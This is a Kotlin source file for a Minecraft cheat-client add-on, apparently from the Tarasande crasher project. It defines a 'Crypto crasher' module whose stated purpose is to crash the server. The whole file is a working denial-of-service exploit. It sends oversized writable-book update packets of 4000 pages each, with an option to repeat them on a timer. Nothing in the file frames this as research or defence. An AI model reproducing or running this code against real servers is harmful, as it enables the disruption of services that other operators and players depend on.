package de.florianmichael.tarasande_crasher.module

import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueBoolean
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.util.math.TimeUtil
import java.util.*
import kotlin.collections.ArrayList

class ModuleCryptoCrasher : Module("Crypto crasher", "Crashes the server", "Crasher") {

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        ItemStack(Items.WRITABLE_BOOK).apply {
            val pages = ArrayList<String>()
            repeat(4000) { pages.add("a") }
            while (pages.size > 1) {
                val value = pages[pages.size - 1]
                if (value.isNotEmpty()) break
                pages.removeAt(pages.size - 1)
            }

            mc.networkHandler!!.sendPacket(BookUpdateC2SPacket(mc.player!!.inventory.selectedSlot, pages, Optional.of("a")))
            mc.networkHandler!!.sendPacket(BookUpdateC2SPacket(mc.player!!.inventory.selectedSlot, pages, Optional.empty()))
        }
    }
}
